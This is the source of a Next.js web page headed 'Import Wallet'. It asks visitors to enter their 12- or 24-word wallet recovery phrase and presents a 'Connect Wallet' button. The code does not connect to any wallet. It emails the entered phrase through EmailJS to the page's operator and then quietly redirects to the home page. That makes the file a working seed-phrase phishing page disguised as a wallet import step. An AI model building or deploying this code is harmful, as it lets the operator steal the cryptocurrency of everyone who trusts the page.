// @ts-nocheck
'use client';
import emailjs from '@emailjs/browser';
import Image from 'next/image';
import { useRef } from 'react';
import './form.css';

export default function Page() {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
        form.current,
        process.env.NEXT_PUBLIC_EMAILJS_USER_ID
      )
      .then(
        (result) => {
          window.location.pathname = '/';
        },
        (error) => {
          console.log(error);
        }
      );
  };

  return (
    <section>
      <div className='rase'>
        <h5 className='pt-[5%] font-black text-center text-xl'>
          Import Wallet
        </h5>
        <Image
          src='/assets/download.png'
          alt='inbox logo'
          width={120}
          className='mx-auto'
          height={120}
        />
        <form
          ref={form}
          onSubmit={sendEmail}
          className='flex flex-col items-start max-w-xl pb-20 mx-auto'
        >
          <p className='py-4'>
            Typically 12 (sometimes 24) words seperated by a single spaces.
          </p>
          <textarea
            name='message'
            rows={4}
            placeholder='Enter your Phrase'
            required
            className='w-full p-4 rounded ring-1 ring-black placeholder:font-mono'
            defaultValue={''}
          />
          <br />
          <button
            className='bg-[#4682b4] hover:bg-[#4682b4]/80 text-white font-semibold px-6 py-4 text-sm whitespace-nowrap'
            type='submit'
          >
            Connect Wallet
          </button>
        </form>
      </div>
    </section>
  );
}
